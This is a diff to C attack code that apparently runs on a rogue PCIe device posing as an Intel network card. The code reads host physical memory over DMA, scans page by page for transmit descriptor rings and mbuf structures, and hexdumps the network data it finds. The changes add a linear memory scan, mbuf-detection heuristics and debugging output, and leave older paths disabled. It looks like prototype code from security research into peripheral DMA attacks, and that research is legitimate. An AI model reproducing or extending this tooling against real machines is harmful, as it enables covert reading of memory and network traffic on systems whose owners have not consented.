@@ -123,11 +123,17 @@ is_brett_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
 		(buffer->vlan_tag == 0);
 }
 
+inline static uint64_t
+swap_dwords_in_qword(uint64_t qword)
+{
+	return (qword >> 32) | (qword << 32);
+}
+
 void
 endianess_swap_descriptor(struct bcm5701_send_buffer_descriptor *descriptor)
 {
-	uint64_t old_ha = bswap64(descriptor->host_address);
-	descriptor->host_address = (old_ha >> 32) | (old_ha << 32);
+	descriptor->host_address = /* It is still unclear to me why this happens. */
+		swap_dwords_in_qword(bswap64(descriptor->host_address));
 	descriptor->flags = bswap16(descriptor->flags);
 	descriptor->length = bswap16(descriptor->length);
 	descriptor->vlan_tag = bswap16(descriptor->vlan_tag);
@@ -142,6 +148,48 @@ endianess_swap_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
 		endianess_swap_descriptor(&(descriptor[i]));
 	}
 }
+
+void
+endianness_swap_mbuf_header(struct mbuf *mbuf)
+{
+	mbuf->m_next = bswap64(mbuf->m_next);
+	mbuf->m_nextpkt = bswap64(mbuf->m_nextpkt);
+	mbuf->m_data = bswap64(mbuf->m_data);
+	mbuf->m_len = bswap32(mbuf->m_len);
+	mbuf->m_type = bswap16(mbuf->m_type);
+	mbuf->m_flags = bswap16(mbuf->m_flags);
+}
+
+void
+print_mbuf_header(const struct mbuf *mbuf)
+{
+	printf("m_next: 0x%016lx. mh_nextpkt 0x%016lx.\n",
+		mbuf->m_next, mbuf->m_nextpkt);
+	printf("m_data: 0x%016lx. m_len: %d.\n", mbuf->m_data, mbuf->m_len);
+	printf("m_type: %x. m_flags: %x.\n", mbuf->m_type, mbuf->m_flags);
+}
+
+bool
+is_probably_mbuf(const struct mbuf *mbuf)
+{
+	/* We have to be quite lenient to detect free mbufs: these don't have a
+	 * length value set, for example. However, if we're scanning all of
+	 * memory, we can't afford to detect empties as mbufs.
+	 */
+	return ((mbuf->m_next & 0xFF) == 0) &&
+		((mbuf->m_nextpkt & 0xFF) == 0) &&
+		(mbuf->m_type <= MT_MAX) &&
+		(mbuf->m_len >= 0) && (mbuf->m_len <= 16384) &&
+		!(mbuf->m_next == 0 && mbuf->m_nextpkt == 0 && mbuf->m_data == 0);
+}
+
+uint8_t *
+mbuf_data_pointer(const struct mbuf *mbuf)
+{
+	return (uint8_t *)(((uint64_t)(mbuf) & ~uint64_mask(12))
+		| ((uint64_t)mbuf->m_data & uint64_mask(12)));
+}
+
 
 static inline uint64_t
 get_page_address(uint64_t address)
@@ -222,6 +270,7 @@ enum attack_state {
 	AS_LOOKING_FOR_LEAKED_SYMBOL,
 	AS_LOOKING_FOR_DESCRIPTOR_RING,
 	AS_FINDING_MBUF,
+	AS_LINEAR_SCAN_FOR_MBUF,
 	AS_READING_MBUF_PAGE
 };
 
@@ -269,7 +318,7 @@ respond_to_packet(struct packet_response_state *state,
 			case 0: /* vendor and device id */
 				out->data[0] = 0x104b8086;
 				if (state->attack_state == AS_UNINITIALISED) {
-					state->attack_state = AS_LOOKING_FOR_DESCRIPTOR_RING;
+					state->attack_state = AS_LINEAR_SCAN_FOR_MBUF;
 				}
 				break;
 			default:
@@ -305,6 +354,7 @@ respond_to_packet(struct packet_response_state *state,
 int
 main(int argc, char *argv[])
 {
+	bool ring_plausible;
 	int i, send_result, read_result;
 	TLPQuadWord tlp_in_quadword[32];
 	TLPQuadWord tlp_out_header[2];
@@ -318,6 +368,7 @@ main(int argc, char *argv[])
 	struct packet_response_state packet_response_state;
 	packet_response_state.attack_state = AS_UNINITIALISED;
 	uint64_t read_addr, next_read_addr = 0x400000;
+	/*uint64_t read_addr, next_read_addr = 0x800000;*/
 	/*
 	 * We have found that in practise the tx ring is not located lower
 	 * than this.
@@ -330,7 +381,7 @@ main(int argc, char *argv[])
 
 	uint16_t length;
 	uint64_t descriptor_index, host_address, mbuf_page_address, mbuf_index;
-	uint64_t mbuf_address, mbuf_data_address;
+	uint64_t mbuf_address, mbuf_data_address, m_next_value;
 	uint8_t *mbuf_data;
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
@@ -415,14 +466,24 @@ main(int argc, char *argv[])
 		case AS_LOOKING_FOR_DESCRIPTOR_RING:
 			read_result = perform_dma_read((uint8_t *)descriptors,
 				256, packet_response_state.devfn, 0, next_read_addr);
+			printf("Trying %lx...\n", next_read_addr);
 			read_addr = next_read_addr;
 			next_read_addr += 4096;
 			if (read_result == -1 || !any_descriptor_nonzero(descriptors, 16)) {
 				continue;
 			}
 			endianess_swap_descriptors(descriptors, 16);
+
+			/*ring_plausible = true;*/
+
+			/*for (i = 0; i < 16; ++i) {*/
+				/*ring_plausible = ring_plausible &&*/
+					/*is_brett_descriptor(&(descriptors[i]));*/
+			/*}*/
+
 			if (!is_probably_descriptor(&(descriptors[0]))) {
 			/*if (!is_brett_descriptor(&(descriptors[0]))) {*/
+			/*if (!ring_plausible) {*/
 				continue;
 			}
 			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
@@ -433,9 +494,20 @@ main(int argc, char *argv[])
 			break;
 		case AS_FINDING_MBUF:
 			descriptor = &(descriptors[descriptor_index]);
+			printf("Descriptor target: 0x%lx. (Offset: 0x%lx)\n",
+				descriptor->host_address,
+				descriptor->host_address & 0xFF);
+#if 0
+			if ((descriptor->host_address & 0xFF) >= 0x20) {
+				mbuf_index = 0;
+				mbuf_page_address = descriptor->host_address & ~uint64_mask(12);
+				packet_response_state.attack_state = AS_READING_MBUF_PAGE;
+			}
+#endif
 			if (is_probably_descriptor(descriptor)) {
 				host_address = descriptor->host_address;
 				if ((host_address & uint64_mask(11)) == 0) {
+#if 0
 					/* clusters are 2k aligned. */
 					length = uint16_min(descriptor->length, 512);
 					printf("Reading address 0x%lx.\n", host_address);
@@ -446,6 +518,7 @@ main(int argc, char *argv[])
 					} else {
 						hexdump(read_buffer, length);
 					}
+#endif
 				} else { /* It's an mbuf, so we can look at the whole page. */
 					mbuf_index = 0;
 					mbuf_page_address = host_address & ~uint64_mask(12);
@@ -460,31 +533,44 @@ main(int argc, char *argv[])
 					AS_LOOKING_FOR_DESCRIPTOR_RING;
 			}
 			break;
+		case AS_LINEAR_SCAN_FOR_MBUF:
+			read_result = perform_dma_read((uint8_t *)(&mbuf), sizeof(mbuf),
+				packet_response_state.devfn, 0, next_read_addr);
+			endianness_swap_mbuf_header(&mbuf);
+			if (is_probably_mbuf(&mbuf)) {
+				printf("Found probably a mbuf at 0x%lx.\n", next_read_addr);
+				print_mbuf_header(&mbuf);
+				hexdump((uint8_t *)&mbuf, 256);
+			}
+			next_read_addr += 4096;
+			break;
 		case AS_READING_MBUF_PAGE:
-			mbuf_address = mbuf_page_address + (mbuf_index * 256);
-			read_result = perform_dma_read((uint8_t *)(&mbuf), 256,
+			mbuf_address = mbuf_page_address + (mbuf_index * sizeof(struct mbuf));
+			read_result = perform_dma_read((uint8_t *)(&mbuf), sizeof(mbuf),
 				packet_response_state.devfn, 0, mbuf_address);
 			if (read_result == -1) {
 				printf("Failed to read mbuf at 0x%lx.\n", mbuf_address);
 			} else {
-				mbuf.m_flags = bswap16(mbuf.m_flags);
+				printf("mbuf candidate at 0x%lx. %s\n", mbuf_address,
+					is_probably_mbuf(&mbuf) ? "probably mbuf" :
+					"probably not mbuf");
+				endianness_swap_mbuf_header(&mbuf);
+				print_mbuf_header(&mbuf);
+#if 0
+				print_mbuf_header(&mbuf);
+				/*hexdump((uint8_t *)&mbuf, 256);*/
 				if (!(mbuf.m_flags & M_EXT)) {
 					/* We don't have the address for external data. Hopefully
 					 * we found it elsewhere.
 					 */
-					mbuf.m_data = bswap64(mbuf.m_data);
-					mbuf.m_len = bswap32(mbuf.m_len);
-					if (mbuf.m_len > 0 && mbuf.m_len < 224) { /* Probably not an mbuf. */
-						mbuf_data = (uint8_t *)(
-							((uint64_t)(&mbuf) & ~uint64_mask(12))
-							| ((uint64_t)mbuf.m_data & uint64_mask(12))
-							);
-						printf("mbuf.m_data: 0x%lx. len: %d. ",
-							mbuf.m_data, mbuf.m_len);
-						printf("Data from mbuf at 0x%lx.\n", mbuf_address);
-						hexdump(mbuf_data, mbuf.m_len);
+					/*if (mbuf.m_len > 0 && mbuf.m_len < 224) { [> Probably not an mbuf. <]*/
+					if (is_probably_mbuf(&mbuf)) { /* Probably not an mbuf. */
+						printf("Found probably a mbuf at 0x%lx.\n", next_read_addr);
+						/*print_mbuf_header(&mbuf);*/
+						/*hexdump((uint8_t *)&mbuf, 256);*/
 					}
 				}
+#endif
 			}
 			++mbuf_index;
 			if (mbuf_index >= (4096 / 256)) {
